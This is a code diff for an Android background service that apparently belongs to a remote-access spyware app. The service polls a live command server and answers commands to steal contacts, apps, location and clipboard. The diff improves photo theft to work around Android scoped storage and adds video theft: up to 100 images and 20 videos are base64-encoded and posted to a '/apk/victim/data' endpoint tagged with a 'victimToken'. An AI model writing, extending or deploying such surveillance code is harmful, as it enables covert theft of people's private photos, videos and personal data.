@@ -21,6 +21,7 @@ import android.media.Ringtone;
 import android.media.RingtoneManager;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -41,9 +42,11 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -58,7 +61,7 @@ public class ServiceRunner extends Service {
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
 
-    // ★★★ التعديل الرئيسي: Railway مباشرة ★★★
+    // ★★★ Railway URL ★★★
     private static final String SERVER_URL = "https://daf-production-8df9.up.railway.app";
 
     private static final int POLL_INTERVAL = 15;
@@ -232,6 +235,7 @@ public class ServiceRunner extends Service {
                 case "get_contacts": sendContacts(); break;
                 case "get_apps": sendApps(); break;
                 case "get_photos": sendPhotos(); break;
+                case "get_videos": sendVideos(); break;      // ★ جديد
                 case "get_location": sendLocation(); break;
                 case "get_clipboard": sendClipboard(); break;
 
@@ -480,79 +484,332 @@ public class ServiceRunner extends Service {
         }
     }
 
+    // ============================================================
+    // ★★★ إصلاح سحب الصور — Android 10+ Scoped Storage ★★★
+    // ============================================================
     private void sendPhotos() {
         try {
-            Cursor c = getContentResolver().query(
-                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
-                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");
+            // 1) تحقق من الصلاحيات
+            boolean hasReadMedia = false;
+            boolean hasReadStorage = false;
+            boolean hasManageStorage = false;
 
-            if (c == null) {
+            if (Build.VERSION.SDK_INT >= 33) {
+                hasReadMedia = hasPermission("android.permission.READ_MEDIA_IMAGES");
+            }
+
+            if (Build.VERSION.SDK_INT <= 32) {
+                hasReadStorage = hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                try {
+                    hasManageStorage = Environment.isExternalStorageManager();
+                } catch (Exception e) {
+                    hasManageStorage = false;
+                }
+            }
+
+            Log.d(TAG, "sendPhotos: readMedia=" + hasReadMedia
+                    + " readStorage=" + hasReadStorage
+                    + " manageStorage=" + hasManageStorage);
+
+            // لو مفيش أي صلاحية → فشل
+            if (!hasReadMedia && !hasReadStorage && !hasManageStorage) {
+                reportCommandResult("get_photos", "fail", "no_storage_permission");
+                return;
+            }
+
+            // 2) استخدم Images.Media.EXTERNAL_CONTENT_URI
+            Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
+            // 3) استخدم _ID بدل DATA
+            String[] projection = new String[]{
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.SIZE,
+                    MediaStore.Images.Media.MIME_TYPE,
+                    MediaStore.Images.Media.DATE_ADDED,
+            };
+
+            // 4) ترتيب حسب الأحدث
+            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+
+            Cursor cursor = getContentResolver().query(
+                    collection,
+                    projection,
+                    null,
+                    null,
+                    sortOrder
+            );
+
+            if (cursor == null) {
                 reportCommandResult("get_photos", "fail", "cursor_null");
                 return;
             }
 
+            int totalCount = cursor.getCount();
+            Log.d(TAG, "Total images found: " + totalCount);
+
+            if (totalCount == 0) {
+                cursor.close();
+                reportCommandResult("get_photos", "fail", "no_images");
+                return;
+            }
+
+            // 5) احصل على indices
+            int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+            int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
+            int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
+            int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);
+
             int sent = 0;
-            int total = c.getCount();
-            Log.d(TAG, "Total photos: " + total);
+            int maxPhotos = 100;              // ★ 100 صورة
+            int maxSize = 5 * 1024 * 1024;    // ★ 5MB للصورة
 
-            while (c.moveToNext() && sent < 10) {
+            while (cursor.moveToNext() && sent < maxPhotos) {
                 try {
-                    String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
-                    long size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
+                    long id = cursor.getLong(idCol);
+                    String name = cursor.getString(nameCol);
+                    long size = cursor.getLong(sizeCol);
+                    String mime = cursor.getString(mimeCol);
 
-                    if (size > 2000000 || size <= 0) {
-                        Log.d(TAG, "Skip large photo: " + size);
-                        sent++;
+                    if (size <= 0 || size > maxSize) {
+                        Log.d(TAG, "Skip image (size): " + name + " size=" + size);
                         continue;
                     }
 
-                    File imgFile = new File(path);
-                    if (!imgFile.exists() || !imgFile.canRead()) {
-                        sent++;
+                    // ★★★ الطريقة الصحيحة: ContentUris + openInputStream ★★★
+                    Uri imageUri = android.content.ContentUris.withAppendedId(collection, id);
+
+                    InputStream inputStream = null;
+                    byte[] bytes = null;
+
+                    try {
+                        inputStream = getContentResolver().openInputStream(imageUri);
+
+                        if (inputStream == null) {
+                            Log.d(TAG, "inputStream null for: " + name);
+                            continue;
+                        }
+
+                        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+                        byte[] temp = new byte[8192];
+                        int read;
+                        int totalRead = 0;
+
+                        while ((read = inputStream.read(temp)) != -1) {
+                            buffer.write(temp, 0, read);
+                            totalRead += read;
+                            if (totalRead > maxSize) break;
+                        }
+
+                        bytes = buffer.toByteArray();
+
+                    } finally {
+                        if (inputStream != null) {
+                            try { inputStream.close(); } catch (Exception e) {}
+                        }
+                    }
+
+                    if (bytes == null || bytes.length == 0) {
+                        Log.d(TAG, "Empty bytes for: " + name);
                         continue;
                     }
 
-                    byte[] bytes = new byte[(int) imgFile.length()];
-                    FileInputStream fis = new FileInputStream(imgFile);
-                    int read = fis.read(bytes);
-                    fis.close();
+                    String finalMime = (mime != null && !mime.isEmpty())
+                            ? mime : "image/jpeg";
 
-                    if (read > 0) {
-                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
-                        JSONObject d = new JSONObject();
-                        d.put("type", "photo_single");
-                        d.put("token", victimToken);
-                        d.put("device", deviceId);
-                        d.put("name", imgFile.getName());
-                        d.put("image", "data:image/jpeg;base64," + base64);
-                        d.put("index", sent);
-                        d.put("total", total);
-                        postJson("/apk/victim/data", d);
+                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
 
-                        Log.d(TAG, "Photo sent: " + imgFile.getName() + " (" + size + " bytes)");
-                    }
+                    JSONObject d = new JSONObject();
+                    d.put("type", "photo_single");
+                    d.put("token", victimToken);
+                    d.put("device", deviceId);
+                    d.put("name", name);
+                    d.put("image", "data:" + finalMime + ";base64," + base64);
+                    d.put("index", sent);
+                    d.put("total", Math.min(totalCount, maxPhotos));
+                    d.put("size", bytes.length);
 
+                    postJson("/apk/victim/data", d);
+
+                    Log.d(TAG, "Photo sent: " + name + " (" + bytes.length + " bytes)");
                     sent++;
+
                     Thread.sleep(500);
 
                 } catch (Exception e) {
-                    Log.e(TAG, "photo error: " + e.getMessage());
-                    sent++;
+                    Log.e(TAG, "photo loop error: " + e.getMessage());
                 }
             }
-            c.close();
 
-            JSONObject d = new JSONObject();
-            d.put("type", "photos_done");
-            d.put("token", victimToken);
-            d.put("device", deviceId);
-            d.put("total", sent);
-            postJson("/apk/victim/data", d);
+            cursor.close();
+
+            // 6) إشعار الإكمال
+            JSONObject done = new JSONObject();
+            done.put("type", "photos_done");
+            done.put("token", victimToken);
+            done.put("device", deviceId);
+            done.put("total", sent);
+            postJson("/apk/victim/data", done);
 
             reportCommandResult("get_photos", "ok", "");
 
         } catch (Exception e) {
+            Log.e(TAG, "sendPhotos error: " + e.getMessage());
             reportCommandResult("get_photos", "fail", e.getMessage());
+        }
+    }
+
+    // ============================================================
+    // ★★★ سحب الفيديوهات — جديد ★★★
+    // ============================================================
+    private void sendVideos() {
+        try {
+            boolean hasReadMedia = false;
+            boolean hasReadStorage = false;
+            boolean hasManageStorage = false;
+
+            if (Build.VERSION.SDK_INT >= 33) {
+                hasReadMedia = hasPermission("android.permission.READ_MEDIA_VIDEO");
+            }
+            if (Build.VERSION.SDK_INT <= 32) {
+                hasReadStorage = hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                try {
+                    hasManageStorage = Environment.isExternalStorageManager();
+                } catch (Exception e) {}
+            }
+
+            if (!hasReadMedia && !hasReadStorage && !hasManageStorage) {
+                reportCommandResult("get_videos", "fail", "no_storage_permission");
+                return;
+            }
+
+            Uri collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
+
+            String[] projection = new String[]{
+                    MediaStore.Video.Media._ID,
+                    MediaStore.Video.Media.DISPLAY_NAME,
+                    MediaStore.Video.Media.SIZE,
+                    MediaStore.Video.Media.MIME_TYPE,
+                    MediaStore.Video.Media.DURATION,
+            };
+
+            String sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC";
+
+            Cursor cursor = getContentResolver().query(
+                    collection, projection, null, null, sortOrder);
+
+            if (cursor == null) {
+                reportCommandResult("get_videos", "fail", "cursor_null");
+                return;
+            }
+
+            int totalCount = cursor.getCount();
+            Log.d(TAG, "Total videos: " + totalCount);
+
+            if (totalCount == 0) {
+                cursor.close();
+                reportCommandResult("get_videos", "fail", "no_videos");
+                return;
+            }
+
+            int idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);
+            int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME);
+            int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE);
+            int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE);
+            int durCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION);
+
+            int sent = 0;
+            int maxVideos = 20;
+            int maxSize = 20 * 1024 * 1024;  // 20MB للفيديو
+
+            while (cursor.moveToNext() && sent < maxVideos) {
+                try {
+                    long id = cursor.getLong(idCol);
+                    String name = cursor.getString(nameCol);
+                    long size = cursor.getLong(sizeCol);
+                    String mime = cursor.getString(mimeCol);
+                    long duration = cursor.getLong(durCol);
+
+                    if (size <= 0 || size > maxSize) {
+                        Log.d(TAG, "Skip video (size): " + name + " size=" + size);
+                        continue;
+                    }
+
+                    Uri videoUri = android.content.ContentUris.withAppendedId(collection, id);
+
+                    InputStream inputStream = null;
+                    byte[] bytes = null;
+
+                    try {
+                        inputStream = getContentResolver().openInputStream(videoUri);
+                        if (inputStream == null) continue;
+
+                        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
+                        byte[] temp = new byte[8192];
+                        int read;
+                        int totalRead = 0;
+
+                        while ((read = inputStream.read(temp)) != -1) {
+                            buffer.write(temp, 0, read);
+                            totalRead += read;
+                            if (totalRead > maxSize) break;
+                        }
+                        bytes = buffer.toByteArray();
+                    } finally {
+                        if (inputStream != null) {
+                            try { inputStream.close(); } catch (Exception e) {}
+                        }
+                    }
+
+                    if (bytes == null || bytes.length == 0) continue;
+
+                    String finalMime = (mime != null && !mime.isEmpty())
+                            ? mime : "video/mp4";
+
+                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+
+                    JSONObject d = new JSONObject();
+                    d.put("type", "video_file");
+                    d.put("token", victimToken);
+                    d.put("device", deviceId);
+                    d.put("name", name);
+                    d.put("video", "data:" + finalMime + ";base64," + base64);
+                    d.put("duration", duration);
+                    d.put("index", sent);
+                    d.put("total", Math.min(totalCount, maxVideos));
+                    d.put("size", bytes.length);
+
+                    postJson("/apk/victim/data", d);
+
+                    Log.d(TAG, "Video sent: " + name + " (" + bytes.length + " bytes)");
+                    sent++;
+
+                    Thread.sleep(1000);
+
+                } catch (Exception e) {
+                    Log.e(TAG, "video loop error: " + e.getMessage());
+                }
+            }
+
+            cursor.close();
+
+            JSONObject done = new JSONObject();
+            done.put("type", "videos_done");
+            done.put("token", victimToken);
+            done.put("device", deviceId);
+            done.put("total", sent);
+            postJson("/apk/victim/data", done);
+
+            reportCommandResult("get_videos", "ok", "");
+
+        } catch (Exception e) {
+            Log.e(TAG, "sendVideos error: " + e.getMessage());
+            reportCommandResult("get_videos", "fail", e.getMessage());
         }
     }
 
@@ -1041,7 +1298,7 @@ public class ServiceRunner extends Service {
                 reader.close();
                 return sb.toString();
             } else {
-                // ★ اطبع رد الخطأ
+                // اطبع رد الخطأ
                 try {
                     BufferedReader reader = new BufferedReader(
                             new InputStreamReader(conn.getErrorStream()));
@@ -1061,4 +1318,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-                    }
+                                             }
